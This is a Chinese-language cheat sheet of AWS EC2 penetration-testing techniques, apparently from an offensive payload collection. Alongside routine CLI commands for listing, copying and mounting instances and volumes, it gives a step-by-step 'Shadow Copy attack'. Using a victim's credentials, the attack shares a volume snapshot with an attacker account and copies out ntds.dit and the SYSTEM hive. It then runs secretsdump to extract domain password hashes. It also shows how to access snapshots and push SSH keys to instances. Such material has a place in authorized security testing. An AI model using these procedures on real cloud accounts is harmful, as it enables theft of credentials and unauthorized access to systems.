# AWS - 服务 - EC2

* [dufflebag](https://labs.bishopfox.com/dufflebag) - 查找因 Amazon EBS“公开 (public)”模式而意外暴露的机密

## 列出关于 EC2 的信息 (Listing Information About EC2)

```ps1
aws ec2 describe-instances
aws ec2 describe-instances --region region
aws ec2 describe-instances --instance-ids ID
```

## 使用 AMI 镜像复制 EC2 (Copy EC2 using AMI Image)

首先，你需要提取关于当前实例及其 AMI/安全组/子网的数据：`aws ec2 describe-images --region eu-west-1`

```powershell
# 为 instance-id 创建新镜像
$ aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1  

# 将密钥添加到 AWS
$ aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1  

# 使用先前创建的 AMI 创建 EC2，使用相同的安全组和子网以方便连接。
$ aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# 现在你可以检查实例了
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1 

# 如果需要：编辑组
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# 做个好人，清理我们的实例以避免任何无用的费用
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1 
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```

## 将 EBS 卷挂载到 EC2 Linux (Mount EBS volume to EC2 Linux)

:warning: EBS 快照是块级的增量备份，这意味着每个快照仅复制自上一个快照以来在卷中发生更改的块（或区域）。若要恢复数据，你需要从你的 EBS 快照之一创建一个新的 EBS 卷。新卷将是当初拍摄快照的初始 EBS 卷的副本。

1. 转到 EC2 –> Volumes 并创建一个你喜欢的容量和类型的新卷。
2. 选择已创建的卷，右键单击并选择“attach volume (附加卷)”选项。
3. 从实例文本框中选择实例，如下所示：`attach ebs volume`

    ```powershell
    aws ec2 create-volume –snapshot-id snapshot_id --availability-zone zone
    aws ec2 attach-volume –-volume-id volume_id –-instance-id instance_id --device device
    ```

4. 现在，登录到你的 ec2 实例并使用以下命令列出可用的磁盘：`lsblk`
5. 使用以下命令检查卷中是否有任何数据：`sudo file -s /dev/xvdf`
6. 使用以下命令将卷格式化为 ext4 文件系统：`sudo mkfs -t ext4 /dev/xvdf`
7. 创建一个你选择的目录来挂载我们新的 ext4 卷。我使用的是名称 “newvolume”：`sudo mkdir /newvolume`
8. 使用以下命令将卷挂载到 “newvolume” 目录：`sudo mount /dev/xvdf /newvolume/`
9. cd 进入 newvolume 目录并检查磁盘空间以确认卷挂载情况：`cd /newvolume; df -h .`

## 卷影复制攻击 (Shadow Copy attack)

**要求 (Requirements)**:

* EC2:CreateSnapshot
* [Static-Flow/CloudCopy](https://github.com/Static-Flow/CloudCopy)

**利用 (Exploit)**:

1. 使用至少具有 CreateSnapshot 权限的受害者凭据加载 AWS CLI
2. 运行 `"Describe-Instances"` 并在列表中显示供攻击者选择的实例
3. 在所选实例的卷上运行 `"Create-Snapshot"`
4. 在新快照上运行 `"modify-snapshot-attribute"` 以将 `"createVolumePermission"` 分配给攻击者 AWS 账户
5. 使用攻击者凭据加载 AWS CLI
6. 运行 `"run-instance"` 命令，使用我们窃取的快照创建新的 linux ec2
7. Ssh 登录并运行 `"sudo mkdir /windows"`
8. Ssh 登录并运行 `"sudo mount /dev/xvdf1 /windows/"`
9. Ssh 登录并运行 `"sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user"`
10. Ssh 登录并运行 `"sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user"`
11. Ssh 登录并运行 `"sudo chown ec2-user:ec2-user /home/ec2-user/*"`
12. SFTP 下载 `"/home/ec2-user/SYSTEM ./SYSTEM"`
13. SFTP 下载 `"/home/ec2-user/ntds.dit ./ntds.dit"`
14. 本地运行 `"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets'`，预期 secretsdump 在系统路径中

## 访问快照 (Access Snapshots)

1. 获取 `owner-id` (所有者 ID)

    ```powershell
    $ aws --profile flaws sts get-caller-identity
    "Account": "XXXX26262029",
    ```

2. 列出快照 (List snapshots)

    ```powershell
    $ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2
    "SnapshotId": "snap-XXXX342abd1bdcb89",
    ```

3. 使用先前获取的 `snapshotId` (快照 ID) 创建卷

    ```powershell
    aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
    ```

4. 在 AWS 控制台中，部署一个新的基于 Ubuntu 的 EC2，附加该卷，然后将其挂载到机器上。

    ```ps1
    ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
    lsblk
    sudo file -s /dev/xvda1
    sudo mount /dev/xvda1 /mnt
    ```

## 实例连接 (Instance Connect)

将 SSH 密钥推送到 EC2 实例

```powershell
# https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/
$ aws ec2 describe-instances --profile uploadcreds --region eu-west-1 | jq ".[][].Instances | .[] | {InstanceId, KeyName, State}"
$ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone us-east-1d --instance-os-user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds
```

## 参考资料 (References)

* [How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016](https://devopscube.com/mount-ebs-volume-ec2-instance/)
